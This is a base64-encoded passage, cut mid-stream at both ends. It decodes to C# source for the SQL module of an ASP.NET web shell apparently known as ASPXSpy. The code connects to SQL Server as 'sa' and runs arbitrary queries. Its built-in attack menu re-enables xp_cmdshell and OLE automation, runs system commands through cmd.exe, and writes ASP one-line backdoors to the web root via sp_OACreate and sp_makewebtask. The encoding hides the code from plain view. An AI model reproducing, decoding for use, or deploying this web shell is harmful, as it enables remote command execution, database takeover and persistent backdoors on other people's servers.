QmluX1RhYmxlIl0gPSBudWxsOwogICAgICAgIEJpbl9TUUxjb25uVGV4dEJveC5UZXh0ID0gInNlcnZlcj1sb2NhbGhvc3Q7VUlEPXNhO1BXRD07ZGF0YWJhc2U9bWFzdGVyO1Byb3ZpZGVyPVNRTE9MRURCIjsKICAgICAgICBCaW5fU1FMUmFkaW9CdXR0b24uQ2hlY2tlZCA9IHRydWU7CiAgICAgICAgQmluX0FjY1JhZGlvQnV0dG9uLkNoZWNrZWQgPSBmYWxzZTsKICAgICAgICBCaW5fQWNjUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0RCbWVudVBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9BY2NSYWRpb0J1dHRvbl9DaGVja2VkQ2hhbmdlZChvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBTZXNzaW9uWyJCaW5fVGFibGUiXSA9IG51bGw7CiAgICAgICAgQmluX1NRTGNvbm5UZXh0Qm94LlRleHQgPSBAIlByb3ZpZGVyPU1pY3Jvc29mdC5KZXQuT0xFREIuNC4wO0RhdGEgU291cmNlPUU6XHd3d3Jvb3RcZGF0YWJhc2UubWRiIjsKICAgICAgICBCaW5fU1FMUmFkaW9CdXR0b24uQ2hlY2tlZCA9IGZhbHNlOwogICAgICAgIEJpbl9BY2NSYWRpb0J1dHRvbi5DaGVja2VkID0gdHJ1ZTsKICAgICAgICBCaW5fREJtZW51UGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9BY2NQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0RhdGFHcmlkLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fU2Nyb2xsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAKICAgIH0KICAgIHByb3RlY3RlZCB2b2lkIE9wZW5Db25uZWN0aW9uKCkgCiAgICB7CiAgICAgICAgaWYgKGNvbm4uU3RhdGUgPT0gQ29ubmVjdGlvblN0YXRlLkNsb3NlZCkKICAgICAgICB7CiAgICAgICAgICAgIHRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBjb25uLkNvbm5lY3Rpb25TdHJpbmcgPSBCaW5fU1FMY29ublRleHRCb3guVGV4dDsKICAgICAgICAgICAgICAgIGNvbW0uQ29ubmVjdGlvbiA9IGNvbm47CiAgICAgICAgICAgICAgICBjb25uLk9wZW4oKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIEVycm9yKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBCaW5fRXJyb3IoRXJyb3IuTWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBwcm90ZWN0ZWQgdm9pZCBDbG9zZUNvbm5lY3Rpb24oKQogICAgewogICAgICAgIGlmIChjb25uLlN0YXRlID09IENvbm5lY3Rpb25TdGF0ZS5PcGVuKQogICAgICAgICAgICBjb25uLkNsb3NlKCk7CiAgICAgICAgICAgIGNvbm4uRGlzcG9zZSgpOwogICAgICAgICAgICBjb21tLkRpc3Bvc2UoKTsKICAgIH0KICAgIHB1YmxpYyBEYXRhVGFibGUgQmluX0RhdGFUYWJsZShzdHJpbmcgc3Fsc3RyKQogICAgewogICAgICAgIE9sZURiRGF0YUFkYXB0ZXIgZGEgPSBuZXcgT2xlRGJEYXRhQWRhcHRlcigpOwogICAgICAgIERhdGFUYWJsZSBkYXRhdGFibGUgPSBuZXcgRGF0YVRhYmxlKCk7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBPcGVuQ29ubmVjdGlvbigpOwogICAgICAgICAgICBjb21tLkNvbW1hbmRUeXBlID0gQ29tbWFuZFR5cGUuVGV4dDsKICAgICAgICAgICAgY29tbS5Db21tYW5kVGV4dCA9IHNxbHN0cjsKICAgICAgICAgICAgZGEuU2VsZWN0Q29tbWFuZCA9IGNvbW07CiAgICAgICAgICAgIGRhLkZpbGwoZGF0YXRhYmxlKTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbikKICAgICAgICB7CiAgICAgICAgfQogICAgICAgIGZpbmFsbHkKICAgICAgICB7CiAgICAgICAgICAgIENsb3NlQ29ubmVjdGlvbigpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZGF0YXRhYmxlOwogICAgfQogICAgcHJvdGVjdGVkIHZvaWQgU1FMX1N1bWJpdEJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFNlc3Npb25bIkJpbl9UYWJsZSJdID0gbnVsbDsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLkN1cnJlbnRQYWdlSW5kZXggPSAwOwogICAgICAgICAgICBCaW5fRGF0YUdyaWQuQWxsb3dQYWdpbmcgPSB0cnVlOwogICAgICAgICAgICBpZiAoQmluX1NRTFJhZGlvQnV0dG9uLkNoZWNrZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEJpbl9EQm1lbnVQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgICAgIEJpbl9EQmluZm9MYWJlbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgICAgIEJpbl9BY2NQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICBCaW5fU2Nyb2xsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgIEJpbl9kaXJQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICBPcGVuQ29ubmVjdGlvbigpOwogICAgICAgICAgICAgICAgRGF0YVRhYmxlIHZlciA9IEJpbl9EYXRhVGFibGUoQCJTRUxFQ1QgQEBWRVJTSU9OIik7CiAgICAgICAgICAgICAgICBEYXRhVGFibGUgZGJzID0gQmluX0RhdGFUYWJsZShAIlNFTEVDVCBuYW1lIEZST00gbWFzdGVyLmRiby5zeXNkYXRhYmFzZXMiKTsKICAgICAgICAgICAgICAgIERhdGFUYWJsZSBjZGIgPSBCaW5fRGF0YVRhYmxlKEAiU0VMRUNUIERCX05BTUUoKSIpOwogICAgICAgICAgICAgICAgRGF0YVRhYmxlIHJvbCA9IEJpbl9EYXRhVGFibGUoQCJTRUxFQ1QgSVNfU1JWUk9MRU1FTUJFUignc3lzYWRtaW4nKSIpOwogICAgICAgICAgICAgICAgRGF0YVRhYmxlIG93bmVyID0gQmluX0RhdGFUYWJsZShAIlNFTEVDVCBJU19NRU1CRVIoJ2RiX293bmVyJykiKTsKICAgICAgICAgICAgICAgIHN0cmluZyBkYm8gPSAiIjsKICAgICAgICAgICAgICAgIGlmIChvd25lci5Sb3dzWzBdWzBdLlRvU3RyaW5nKCkgPT0gIjEiKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGRibyA9ICJkYl9vd25lciI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZGJvID0gInB1YmxpYyI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAocm9sLlJvd3NbMF1bMF0uVG9TdHJpbmcoKSA9PSAiMSIpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZGJvID0gIjxmb250IGNvbG9yPWJsdWU+c2E8L2ZvbnQ+IjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHN0cmluZyBkYl9pbmZvID0gIiI7CiAgICAgICAgICAgICAgICBkYl9pbmZvID0gIjxpPjxiPjxmb250IGNvbG9yPXJlZD5TUUx2ZXJzaW9uPC9mb250PiA6IDwvYj48L2k+IiArIHZlci5Sb3dzWzBdWzBdLlRvU3RyaW5nKCkgKyAiPGJyPjxocj4iOwogICAgICAgICAgICAgICAgc3RyaW5nIGRiX25hbWUgPSAiIjsKICAgICAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgZGJzLlJvd3MuQ291bnQ7IGkrKykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBkYl9uYW1lICs9IGRicy5Sb3dzW2ldWzBdLlRvU3RyaW5nKCkuUmVwbGFjZShjZGIuUm93c1swXVswXS5Ub1N0cmluZygpLCAiPGZvbnQgY29sb3I9Ymx1ZT4iICsgY2RiLlJvd3NbMF1bMF0uVG9TdHJpbmcoKSArICI8L2ZvbnQ+IikgKyAiJm5ic3A7fCZuYnNwOyI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBkYl9pbmZvICs9ICI8aT48Yj48Zm9udCBjb2xvcj1yZWQ+RGF0YUJhc2U8L2ZvbnQ+IDogPC9iPjwvaT48ZGl2IHN0eWxlPVwid2lkdGg6NzYwcHg7d29yZC1icmVhazpicmVhay1hbGxcIj4iICsgZGJfbmFtZSArICI8YnI+PGRpdj48aHI+IjsKICAgICAgICAgICAgICAgIGRiX2luZm8gKz0gIjxpPjxiPjxmb250IGNvbG9yPXJlZD5TUlZST0xFTUVNQkVSPC9mb250PjwvaT48L2I+IDogIiArIGRibyArICI8aHI+IjsKICAgICAgICAgICAgICAgIEJpbl9EQmluZm9MYWJlbC5UZXh0ID0gZGJfaW5mbzsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoQmluX0FjY1JhZGlvQnV0dG9uLkNoZWNrZWQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICBCaW5fU0FleGVjQnV0dG9uLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgIEJpbl9BY2NiaW5kKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBFKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEUuTWVzc2FnZSk7CiAgICAgICAgfQogICAgfQogICAgcHJvdGVjdGVkIHZvaWQgQmluX0FjY2JpbmQoKSAKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9EQm1lbnVQYW5lbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgIEJpbl9BY2NQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgT3BlbkNvbm5lY3Rpb24oKTsKICAgICAgICAgICAgRGF0YVRhYmxlIGFjY3RhYmxlID0gbmV3IERhdGFUYWJsZSgpOwogICAgICAgICAgICBhY2N0YWJsZSA9IGNvbm4uR2V0T2xlRGJTY2hlbWFUYWJsZShPbGVEYlNjaGVtYUd1aWQuVGFibGVzLCBuZXcgT2JqZWN0W10geyBudWxsLCBudWxsLCBudWxsLCAiVGFibGUiIH0pOwogICAgICAgICAgICBzdHJpbmcgYWNjc3RyID0gIjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWdvYWN0aW9uPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXRvZG8+IjsKICAgICAgICAgICAgYWNjc3RyICs9ICJUYWJsZXMgQ291bnQgOiAiICsgYWNjdGFibGUuUm93cy5Db3VudCArICI8YnI+UGxlYXNlIHNlbGVjdCBhIGRhdGFiYXNlIDogPFNFTEVDVCBvbmNoYW5nZT1pZih0aGlzLnZhbHVlIT0nJylDb21tYW5kKCdwb3N0ZGF0YScsdGhpcyk7PiI7CiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgYWNjdGFibGUuUm93cy5Db3VudDsgaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBhY2NzdHIgKz0gIjxvcHRpb24gdmFsdWU9IiArIGFjY3RhYmxlLlJvd3NbaV0uSXRlbUFycmF5WzJdLlRvU3RyaW5nKCkgKyAiPiIgKyBhY2N0YWJsZS5Sb3dzW2ldLkl0ZW1BcnJheVsyXS5Ub1N0cmluZygpICsgIjwvb3B0aW9uPiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKFNlc3Npb25bIkJpbl9UYWJsZSJdICE9IG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGFjY3N0ciArPSAiPG9wdGlvbiBTRUxFQ1RFRD4iICsgU2Vzc2lvblsiQmluX1RhYmxlIl0gKyAiPC9vcHRpb24+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBhY2NzdHIgKz0gIjwvU0VMRUNUPiI7CiAgICAgICAgICAgIEJpbl9BY2NpbmZvTGFiZWwuVGV4dCA9IGFjY3N0cjsKICAgICAgICAgICAgQ2xvc2VDb25uZWN0aW9uKCk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpIAogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KICAgIHByb3RlY3RlZCB2b2lkIEJpbl9EYXRhYmluZCgpIAogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgQmluX1NBZXhlY0J1dHRvbi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgIEJpbl9BY2NiaW5kKCk7CiAgICAgICAgICAgIEJpbl9TY3JvbGwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgIGlmIChCaW5fU1FMUmFkaW9CdXR0b24uQ2hlY2tlZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQmluX0RCbWVudVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgICAgICAgICAgQmluX0RCaW5mb0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBCaW5fRGF0YUdyaWQuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgIERhdGFUYWJsZSBkYXRhYmluZCA9IEJpbl9EYXRhVGFibGUoQCJTRUxFQ1QgKiBGUk9NICIgKyBTZXNzaW9uWyJCaW5fVGFibGUiXSk7CiAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5EYXRhU291cmNlID0gZGF0YWJpbmQ7CiAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5EYXRhQmluZCgpOyAgICAgCiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gRXJyb3IpCiAgICAgICAgewogICAgICAgICAgICAKICAgICAgICAgICAgQmluX0Vycm9yKEVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgdm9pZCBCaW5fRXhlY1NxbChzdHJpbmcgaW5zdHIpIAogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgT3BlbkNvbm5lY3Rpb24oKTsKICAgICAgICAgICAgY29tbS5Db21tYW5kVHlwZSA9IENvbW1hbmRUeXBlLlRleHQ7CiAgICAgICAgICAgIGNvbW0uQ29tbWFuZFRleHQgPSBpbnN0cjsKICAgICAgICAgICAgY29tbS5FeGVjdXRlTm9uUXVlcnkoKTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKSAKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9FcnJvcihlLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KICAgIHB1YmxpYyB2b2lkIEl0ZW1fRGF0YUJvdW5kKG9iamVjdCBzZW5kZXIsRGF0YUdyaWRJdGVtRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgCiAgICAgICAgZm9yIChpbnQgaSA9IDI7IGkgPCBlLkl0ZW0uQ2VsbHMuQ291bnQ7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIGUuSXRlbS5DZWxsc1tpXS5UZXh0ID0gZS5JdGVtLkNlbGxzW2ldLlRleHQuUmVwbGFjZSgiPCIsICImbHQ7IikuUmVwbGFjZSgiPiIsICImZ3Q7Iik7CiAgICAgICAgfQogICAgICAKICAgIH0KICAgcHJvdGVjdGVkIHZvaWQgQmluX0RCUGFnZShvYmplY3Qgc2VuZGVyLCBEYXRhR3JpZFBhZ2VDaGFuZ2VkRXZlbnRBcmdzIGUpIAogICAgewogICAgICAgIEJpbl9EYXRhR3JpZC5DdXJyZW50UGFnZUluZGV4ID0gZS5OZXdQYWdlSW5kZXg7CiAgICAgICAgQmluX0RhdGFiaW5kKCk7CiAgICB9CiAgICBwdWJsaWMgdm9pZCBJdGVtX0NvbW1hbmQob2JqZWN0IHNlbmRlciwgRGF0YUdyaWRDb21tYW5kRXZlbnRBcmdzIGUpIAogICAgewogICAgICAgIGlmIChlLkNvbW1hbmROYW1lID09ICJDYW5jZWwiKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLkVkaXRJdGVtSW5kZXggPSAtMTsKICAgICAgICAgICAgQmluX0RhdGFiaW5kKCk7CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCB2b2lkIEJpbl9FeGVjQnV0dG9uX0NsaWNrKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQogICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIEJpbl9TY3JvbGwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLkFsbG93UGFnaW5nID0gdHJ1ZTsKICAgICAgICAgICAgQmluX0FjY2JpbmQoKTsKICAgICAgICAgICAgaWYgKEJpbl9TUUxSYWRpb0J1dHRvbi5DaGVja2VkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBCaW5fREJtZW51UGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgc3RyaW5nIHNxbHN0ciA9IEJpbl9EQnN0clRleHRCb3guVGV4dDsKICAgICAgICAgICAgc3Fsc3RyID0gc3Fsc3RyLlRyaW1TdGFydCgpLlRvTG93ZXIoKTsKICAgICAgICAgICAgaWYgKHNxbHN0ci5TdWJzdHJpbmcoMCwgNikgPT0gInNlbGVjdCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIERhdGFUYWJsZSBkYXRhYmluZCA9IEJpbl9EYXRhVGFibGUoc3Fsc3RyKTsKICAgICAgICAgICAgICAgIEJpbl9EYXRhR3JpZC5EYXRhU291cmNlID0gZGF0YWJpbmQ7CiAgICAgICAgICAgICAgICBCaW5fRGF0YUdyaWQuRGF0YUJpbmQoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBCaW5fRXhlY1NxbChzcWxzdHIpOwogICAgICAgICAgICAgICAgQmluX0RhdGFiaW5kKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2F0Y2goRXhjZXB0aW9uIGVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKGVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fQkRCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgQmluX0RCaW5mb0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fQWNjYmluZCgpOwogICAgICAgIEJpbl9EQm1lbnVQYW5lbC5WaXNpYmxlID0gdHJ1ZTsKICAgICAgICBCaW5fRGF0YUdyaWQuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9EYXRhR3JpZC5BbGxvd1BhZ2luZyA9IHRydWU7CiAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX0RCc3RyVGV4dEJveC5UZXh0ID0gIiI7CiAgICAgICAgQmluX1NBZXhlY0J1dHRvbi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1Jlc0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIAogICAgfQogICAgCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fU0FDTURCdXR0b25fQ2xpY2sob2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpCiAgICB7CiAgICAgICAgQmluX0RCaW5mb0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fRGF0YUdyaWQuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TY3JvbGwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TQWV4ZWNCdXR0b24uVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0NoYW5nZSgpOwogICAgICAgIEJpbl9FeGVjQnV0dG9uLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fUmVzTGFiZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIFNlc3Npb25bIkJpbl9PcHRpb24iXSA9IG51bGw7CiAgICAgICAgQmluX2RpclBhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAKICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9DaGFuZ2UoKSAKICAgIHsKICAgICAgICBCaW5fRXhlY0J1dHRvbi5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgc3RyaW5nIHNlbGVjdCA9ICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1nb2FjdGlvbj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT10b2RvPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWludGV4dD48c2VsZWN0IG9uY2hhbmdlPWlmKHRoaXMudmFsdWUhPScnKUNvbW1hbmQoJ2NoYW5nZWRhdGEnLHRoaXMpOz48b3B0aW9uPlNRTCBTZXJ2ZXIgRXhlYzxvcHRpb24gdmFsdWU9XCJVc2UgbWFzdGVyIGRiY2MgYWRkZXh0ZW5kZWRwcm9jICgnc3BfT0FDcmVhdGUnLCdvZHNvbGU3MC5kbGwnKVwiPkFkZCBzcF9vYWNyZWF0ZTxvcHRpb24gdmFsdWU9XCJVc2UgbWFzdGVyIGRiY2MgYWRkZXh0ZW5kZWRwcm9jICgneHBfY21kc2hlbGwnLCd4cGxvZzcwLmRsbCcpXCI+QWRkIHhwX2NtZHNoZWxsPG9wdGlvbiB2YWx1ZT1cIkVYRUMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLCAxO1JFQ09ORklHVVJFO0VYRUMgc3BfY29uZmlndXJlICd4cF9jbWRzaGVsbCcsIDE7UkVDT05GSUdVUkU7XCI+QWRkIHhwX2NtZHNoZWxsKFNRTDIwMDUpPG9wdGlvbiB2YWx1ZT1cImV4ZWMgc3BfY29uZmlndXJlICdzaG93IGFkdmFuY2VkIG9wdGlvbnMnLCAxO1JFQ09ORklHVVJFO2V4ZWMgc3BfY29uZmlndXJlICdPbGUgQXV0b21hdGlvbiBQcm9jZWR1cmVzJywxO1JFQ09ORklHVVJFO1wiPkFkZCBzcF9vYWNyZWF0ZShTUUwyMDA1KTxvcHRpb24gdmFsdWU9XCJleGVjIHNwX2NvbmZpZ3VyZSAnc2hvdyBhZHZhbmNlZCBvcHRpb25zJywgMTtSRUNPTkZJR1VSRTtleGVjIHNwX2NvbmZpZ3VyZSAnQWQgSG9jIERpc3RyaWJ1dGVkIFF1ZXJpZXMnLDE7UkVDT05GSUdVUkU7XCI+T3BlbiBPcGVucm93c2V0KFNRTDIwMDUpPG9wdGlvbiB2YWx1ZT1cIkV4ZWMgbWFzdGVyLmRiby54cF9jbWRzaGVsbCAnbmV0IHVzZXInXCI+WFBfY21kc2hlbGwgZXhlYzxvcHRpb24gdmFsdWU9XCJEZWNsYXJlIEBzICBpbnQ7ZXhlYyBzcF9vYWNyZWF0ZSAnd3NjcmlwdC5zaGVsbCcsQHMgb3V0O0V4ZWMgU1BfT0FNZXRob2QgQHMsJ3J1bicsTlVMTCwnY21kLmV4ZSAvYyBlY2hvIF4mbHQ7JWV4ZWN1dGUocmVxdWVzdChjaGFyKDM1KSkpJV4+ID4gYzpcXDEuYXNwJztcIj5TUF9vYW1ldGhvZCBleGVjPG9wdGlvbiB2YWx1ZT1cInNwX21ha2V3ZWJ0YXNrIEBvdXRwdXRmaWxlPSdkOlxcd2ViXFxiaW4uYXNwJyxAY2hhcnNldD1nYjIzMTIsQHF1ZXJ5PSdzZWxlY3QgJyc8JWV4ZWN1dGUocmVxdWVzdChjaHIoMzUpKSkiICsgIiUiICsgIj4nJycgXCI+U1BfbWFrZXdlYnRhc2sgbWFrZSBmaWxlIjsKICAgICAgICBpZiAoU2Vzc2lvblsiQmluX09wdGlvbiJdICE9IG51bGwpCiAgICAgICAgewogICAgICAgICAgICBzZWxlY3QgKz0gIjxvcHRpb24gU0VMRUNURUQ+IiArIFNlc3Npb25bIkJpbl9PcHRpb24iXSArICI8L29wdGlvbj4iOwogICAgICAgIH0KICAgICAgICBzZWxlY3QgKz0gIjwvc2VsZWN0PiI7CiAgICAgICAgQmluX0FjY2luZm9MYWJlbC5UZXh0ID0gc2VsZWN0OwogICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gZmFsc2U7CiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX1NBZXhlY0J1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIEJpbl9DaGFuZ2UoKTsKICAgICAgICAgICAgQmluX0RCaW5mb0xhYmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgQmluX0V4ZWNCdXR0b24uVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICBCaW5fU2Nyb2xsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgQmluX0RhdGFHcmlkLlZpc2libGUgPSBmYWxzZTsKICAgICAgICAgICAgQmluX0RCbWVudVBhbmVsLlZpc2libGUgPSB0cnVlOwogICAgICAgICAgICBzdHJpbmcgc3Fsc3RyID0gQmluX0RCc3RyVGV4dEJveC5UZXh0OwogICAgICAgICAgICBEYXRhVGFibGUgZGF0YWJpbmQgPSBCaW5fRGF0YVRhYmxlKHNxbHN0cik7CiAgICAgICAgICAgIHN0cmluZyByZXMgPSAiIjsKICAgICAgICAgICAgZm9yZWFjaCAoRGF0YVJvdyBkciBpbiBkYXRhYmluZC5Sb3dzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGRhdGFiaW5kLkNvbHVtbnMuQ291bnQ7IGkrKykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICByZXMgKz0gZHJbaV0gKyAiXHIiOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEJpbl9SZXNMYWJlbC5UZXh0ID0gIjxocj48ZGl2IGlkPVwibmVpXCI+PFBSRT4iICsgcmVzLlJlcGxhY2UoIiAiLCAiJm5ic3A7IikuUmVwbGFjZSgiPCIsICImbHQ7IikuUmVwbGFjZSgiPiIsICImZ3Q7IikgKyAiPC9QUkU+PC9kaXY+IjsKICAgICAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgIH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycm9yKQogICAgICAgIHsKICAgICAgICAgICAgQmluX0Vycm9yKGVycm9yLk1lc3NhZ2UpOwogICAgICAgIH0KCiAgICB9CgogICAgcHJvdGVjdGVkIHZvaWQgQmluX0RpckJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0FjY1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fREJpbmZvTGFiZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9EYXRhR3JpZC5WaXNpYmxlID0gZmFsc2U7CiAgICAgICAgQmluX1Njcm9sbC5WaXNpYmxlID0gZmFsc2U7IAogICAgfQogICAgCiAgICBwcm90ZWN0ZWQgdm9pZCBCaW5fbGlzdEJ1dHRvbl9DbGljayhvYmplY3Qgc2VuZGVyLCBFdmVudEFyZ3MgZSkKICAgIHsKICAgICAgICBCaW5fZGlyUGFuZWwuVmlzaWJsZSA9IHRydWU7CiAgICAgICAgQmluX0FjY1BhbmVsLlZpc2libGUgPSBmYWxzZTsKICAgICAgICBCaW5fREJpbmZvTGFiZWwuVmlzaWJsZSA9IGZhbHNlOwogICAgICAgIEJpbl9TcWxEaXIoKTsKICAgIH0KICAgIHB1YmxpYyB2b2lkIEJpbl9TcWxEaXIoKSAKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7Ci